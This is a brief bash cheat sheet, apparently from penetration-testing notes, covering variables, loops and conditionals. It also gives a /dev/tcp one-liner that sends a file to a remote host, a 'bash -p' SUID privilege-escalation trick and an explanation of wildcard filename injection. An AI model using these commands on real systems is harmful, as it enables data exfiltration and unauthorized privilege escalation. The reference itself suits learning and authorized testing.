# bash

## Variables

### Assign Variable

```bash
foo=1
```

```bash
bar=baz
```

### Use Variable

```bash
$foo
```

---

## Strings

### Concatenate Strings

```bash
"$foo $bar literals, too"
```

---

## Arithmetic

```bash
$ n=100
$ ((n=$n+20))
$ echo $n
120
```

---

## For Loop Structure

### For Each
- Single Line

```bash
for name in $(cat names.txt); do echo $name; done
```

- Multiline

```bash
for name in $(cat names.txt); do
    echo $name
done
```

### For i in Range
- Single Line

```bash
for i in {1..254}; do echo "192.168.1.$i"; done
```

- Multiline

```bash
for i in {1..254};
    do echo "192.168.1.$i";
done
```

---

## If Structure
- Single Line

```bash
if [ $foo -gt 0 ]; then echo $foo; fi
```

- Multiline

```bash
if [ $foo -gt 0 ]; then 
    echo $foo
fi
```

---

## File Transfer

```bash
cat $FILE > /dev/tcp/$REMOTE_IP/$REMOTE_PORT
```

---

## Abuse SUID/SGID Bash

If `bash` is SUID and/or SGID, it won't automatically retain the privileges of the owner and/or group when executed by default. To retain those privileges, run it with the `-p` flag.

```bash
bash -p
```

---

## Wildcard Behavior

In `bash`, the wildcard operator `*` creates a string out of all of the file names in the current directory and replaces the wildcard with that string.

For example, let's say the current directory has two files in it: `-l` and `-a`.

```bash
$ ls
-a -l
```

Executing the command `ls *` is equivalent to executing the command `ls -a -l`, because the wildcard injects the file names in the current directory into the command.
